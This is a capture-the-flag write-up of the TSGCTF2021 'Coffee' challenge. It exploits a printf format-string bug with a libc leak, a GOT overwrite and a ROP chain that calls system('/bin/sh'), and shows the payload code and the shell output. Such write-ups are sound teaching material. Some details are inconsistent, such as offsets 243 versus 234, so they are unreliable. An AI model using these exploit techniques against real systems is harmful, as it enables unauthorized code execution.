# TSGCTF2021 - Coffee

- Write-Up Author: Rb916120 \[[MOCTF](https://www.facebook.com/MOCSCTF)\]

- Flag:fakeflag\{lack_of_practices\}

## Challenge Description:

>Coffee is essential for pwning.
>
>[coffee.tar.gz](./coffee.tar.gz)
>
> **i am not solving the chall during the event period, because of lack of practices for awhile :'( so this writeup only for a record.**

## Write up  
__Reference:__  
[Stack frame layout on x86-64](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)  
[PLT and GOT](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)  
[ELF document](https://stevens.netmeister.org/631/elf.html)  
[Exploiting Format String bug](https://tripoloski1337.github.io/ctf/2020/06/11/format-string-bug.html) - good explain for format string bugs  
[printf format string](https://en.wikipedia.org/wiki/Printf_format_string) - printf format string wiki  
[格式化字符串漏洞简介](https://bbs.pediy.com/thread-253638.htm) - read this if you know chinese haha  

---

the security properties of the executable file.  
```
[*] '/home/root/Desktop/CTF/tgsctf2021/coffee/coffee'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ok there is only RELRO and NX enabled. at least we don't have to deal with PIE...
then check the sources code, the code is quite short.(even shorter than the exploit but inspirit so many thing when you dip dive into it)
```c
#include <stdio.h>

int x = 0xc0ffee;
int main(void) {
    char buf[160];
    scanf("%159s", buf);
    if (x == 0xc0ffee) {
        printf(buf);
        x = 0;
    }
    puts("bye");
}

```

first idea for the solution, FSB([printf format string](https://en.wikipedia.org/wiki/Printf_format_string)) appear in my mind because of ***printf(buf)***  
after tried the FSB payload, some of address appear in the output. the first parameter is **6th**
```shell
~/Desktop/CTF/tgsctf2021/coffee$ ./coffee 
aaaaaaaa%p,%p,%p,%p,%p,%p,%p   
aaaaaaaa0xa,(nil),(nil),0x1c,0xffffffffffffff88,0x6161616161616161,0x70252c70252c7025bye
```

---  

**FSB**  

2 key point of FSB 
1. Type filed of printf, **%n Print nothing, but writes the number of characters written so far into an integer pointer parameter**
2. specify the number of parameter, **n\$ n is the number of the parameter to display using this format specifier**, allowing the parameters provided to be output multiple times, using varying format specifiers or in different orders. If any single placeholder specifies a parameter, all the rest of the placeholders MUST also specify a parameter.  

the 32bit payload would be:
```c
[padding][address]%[value]c%[index]$[write_type]
example: 0x11111111%0xc0ffee-len(0x11111111)c%6$n
```
this payload will assign **0xc0ffee** to the 6th parameter **0x11111111** in the stack
  
64bit is dealing with difference way due to printf will ignore the string after the terminate charter(\x00,\xa0), \x00 usually appear in the address. so we just put the address after the assignment type file
```c
%[value]c%[index]$[write_type][padding][address]
```

---

so the **scanf** and **printf** only run once in the program, we need to make the program loop at least twice.
1. leak the libc base address
2. construct payload to get shell

---

### 1. leak address  

first we have to find the Libc address in the stack.
0x7ffff7deb000-0x7ffff7fae000 are libc address
```shell
(gdb) info proc mappings 
process 199826
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /home/root/Desktop/CTF/tgsctf2021/coffee/coffee
            0x401000           0x402000     0x1000     0x1000 /home/root/Desktop/CTF/tgsctf2021/coffee/coffee
            0x402000           0x403000     0x1000     0x2000 /home/root/Desktop/CTF/tgsctf2021/coffee/coffee
            0x403000           0x404000     0x1000     0x2000 /home/root/Desktop/CTF/tgsctf2021/coffee/coffee
            0x404000           0x405000     0x1000     0x3000 /home/root/Desktop/CTF/tgsctf2021/coffee/coffee
            0x405000           0x426000    0x21000        0x0 [heap]
      0x7ffff7deb000     0x7ffff7ded000     0x2000        0x0 
      0x7ffff7ded000     0x7ffff7e13000    0x26000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7ffff7e13000     0x7ffff7f5c000   0x149000    0x26000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7ffff7f5c000     0x7ffff7fa7000    0x4b000   0x16f000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7ffff7fa7000     0x7ffff7fa8000     0x1000   0x1ba000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7ffff7fa8000     0x7ffff7fab000     0x3000   0x1ba000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7ffff7fab000     0x7ffff7fae000     0x3000   0x1bd000 /usr/lib/x86_64-linux-gnu/libc-2.32.so
      0x7ffff7fae000     0x7ffff7fb4000     0x6000        0x0 
      0x7ffff7fcc000     0x7ffff7fd0000     0x4000        0x0 [vvar]
      0x7ffff7fd0000     0x7ffff7fd2000     0x2000        0x0 [vdso]
      0x7ffff7fd2000     0x7ffff7fd3000     0x1000        0x0 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7ffff7fd3000     0x7ffff7ff3000    0x20000     0x1000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7ffff7ff3000     0x7ffff7ffc000     0x9000    0x21000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x29000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x2a000 /usr/lib/x86_64-linux-gnu/ld-2.32.so
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]

``` 
luckly one of libc address can find in the stack before printf and located in $RBP+8 =>0x00007ffff7e14e4a which is __libc_start_main+243
```shell
================48 word hex of RSP==================
0x7fffffffdee0: 0x61616161      0x61616161      0x61616161      0x61616161
....
0x7fffffffdf90: 0x00401230      0x00000000      0xf7e14e4a      0x00007fff
================48 word hex of RBP==================
0x7fffffffdf90: 0x00401230      0x00000000      0xf7e14e4a      0x00007fff <==__libc_start_main+243
0x7fffffffdfa0: 0xffffe088      0x00007fff      0xf7e14c27      0x00000001
....
0x7fffffffe040: 0x00000000      0x00000000      0x004010b0      0x00000000
================next 5 instruction==================
=> 0x4011eb <main+85>:  call   0x401090 <printf@plt>
   0x4011f0 <main+90>:  mov    DWORD PTR [rip+0x2e4e],0x0        # 0x404048 <x>
   0x4011fa <main+100>: lea    rdi,[rip+0xe09]        # 0x40200a
   0x401201 <main+107>: call   0x401070 <puts@plt>
   0x401206 <main+112>: mov    eax,0x0
****************************************************
```

**0x7ffff7e14d60 - 0x00007ffff7e14e4a** offset is 243 to **__libc_start_main**

```shell
(gdb) info address __libc_start_main
Symbol "__libc_start_main" is a function at address 0x7ffff7e14d60.
```

so the way to leak libc address is pretty clear, we have to print the **29th** parameter of the stack and also assign 
detail can be found on [PLT and GOT](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)  

```python
"""
ROPgadget --binary coffee --only "pop|ret"
0x000000000040128b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401293 : pop rdi ; ret
"""
rdi_ret=0x0000000000401293
rbp_ret=0x000000000040128b

# payload to leak libc
payload1  = b""
# print the 29th parameter which is __libc_start_main+243
payload1 += b"%29$018p"
#print rbp_ret-18 to the 9th parameter which is in the stack pointed to put@got
payload1 += b"%"+str.encode(str(rbp_ret-18))+b"c"
payload1 += b"%9$ln"
payload1 = padding(payload1)
payload1 += p64(put_got)
payload1 += p64(main_addr)

s.sendline(payload1)
leak=s.recv()
```

now we have the libc base. then, we have to consider how to let program run system@plt(*binsh)  
```python
# calcuelate libc base address
libc_start_main_addr=int(leak[:18],16)
print("leaked __libc_start_main_addr+234:"+str(hex(libc_start_main_addr)))

libc_base=libc_start_main_addr-libc.symbols["__libc_start_main"]-234
print("libc_base:"+str(hex(libc_base)))
libc_system=libc_base+libc.symbols['system']
libc_binsh=libc_base+next(libc.search(b'/bin/sh'))

 Low Address |                 |
             +-----------------+
     rsp =>  |     padding     |
             +-----------------+
             |     padding     |
             +-----------------+
             |     padding     |
             +-----------------+
             |     padding     |
             +-----------------+
             |   pop rdi;ret   |
             +-----------------+
             |     /bin/sh     |
             +-----------------+
High Address |   *system@plt   |
```

bingo! get shell
```
root@root:~/Desktop/CTF/tgsctf2021/coffee$ ./solve.py 
[+] Starting local process './coffee': pid 200100
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/root/Desktop/CTF/tgsctf2021/coffee/coffee'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
plt_got:0x404018
leaked __libc_start_main_addr+234:0x7f2a4fee5e4a
libc_base:0x7f2a4febe000
[*] Switching to interactive mode
uid=1000(root) gid=1000(root) groups=1000(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),132(scanner)
$ cat flag.txt
fakeflag{lack_of_practices}

```

